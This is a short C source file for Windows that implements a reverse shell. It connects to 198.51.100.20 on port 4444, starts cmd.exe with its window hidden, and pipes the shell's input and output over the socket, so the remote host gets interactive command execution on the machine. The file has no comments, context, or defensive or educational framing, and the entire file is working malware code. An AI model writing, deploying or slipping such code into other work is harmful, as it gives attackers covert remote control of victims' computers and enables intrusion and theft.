#include <winsock2.h>
#include <windows.h>

int main(void) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = inet_addr("198.51.100.20");
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) return 1;

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE in_rd, in_wr, out_rd, out_wr;
    CreatePipe(&in_rd, &in_wr, &sa, 0);
    SetHandleInformation(in_wr, HANDLE_FLAG_INHERIT, 0);
    CreatePipe(&out_rd, &out_wr, &sa, 0);
    SetHandleInformation(out_rd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = in_rd;
    si.hStdOutput = out_wr;
    si.hStdError = out_wr;

    char sh[] = "cmd.exe";
    if (!CreateProcessA(NULL, sh, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) return 1;
    CloseHandle(in_rd);
    CloseHandle(out_wr);

    char buf[4096];
    DWORD avail = 0, nr = 0, nw = 0;
    for (;;) {
        if (PeekNamedPipe(out_rd, NULL, 0, NULL, &avail, NULL) && avail > 0) {
            if (ReadFile(out_rd, buf, sizeof(buf), &nr, NULL) && nr > 0) {
                send(sock, buf, (int)nr, 0);
            }
        }
        u_long mode = 1;
        ioctlsocket(sock, FIONBIO, &mode);
        int r = recv(sock, buf, sizeof(buf), 0);
        if (r > 0) {
            WriteFile(in_wr, buf, (DWORD)r, &nw, NULL);
        }
        if (WaitForSingleObject(pi.hProcess, 10) == WAIT_OBJECT_0) break;
    }
    closesocket(sock);
    return 0;
}
